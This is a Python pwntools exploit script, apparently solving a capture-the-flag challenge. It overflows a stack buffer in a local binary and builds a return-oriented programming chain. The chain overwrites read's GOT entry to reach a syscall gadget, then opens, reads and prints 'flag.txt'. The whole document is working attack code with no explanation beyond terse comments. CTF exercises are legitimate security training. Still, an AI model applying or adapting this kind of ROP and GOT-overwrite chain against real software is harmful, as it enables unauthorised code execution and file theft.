# coding: utf-8

from pwn import *

context.arch = 'amd64'
elf = ELF('./simple')

r = process('./simple')

pop_rax = 0x00000000004004eb
pop_rdi = 0x0000000000400583
pop_rsi_r15 = 0x0000000000400581
add_qptr_rdi_rax = 0x00000000004004ed

read_got = elf.symbols['got.read']
read_plt = elf.symbols['plt.read']
file = elf.symbols['file']
bss = elf.bss()

# read_got -> syscall
payload  = 'a'*0x18 + flat(pop_rdi, read_got, pop_rax, 0xf, add_qptr_rdi_rax)
# open("flag.txt", O_RDONLY)
payload += flat(pop_rdi, file, pop_rsi_r15, 0, 0, pop_rax, 2, read_plt)
# read(fd, bss, 0x100)
payload += flat(pop_rdi, 3, pop_rsi_r15, bss, 0, pop_rax, 0, read_plt)
# write(1, bss, 0x100)
payload += flat(pop_rdi, 1, pop_rsi_r15, bss, 0, pop_rax, 1, read_plt)

r.sendline(payload)
#gdb.attach(r)
r.shutdown('send')
r.interactive()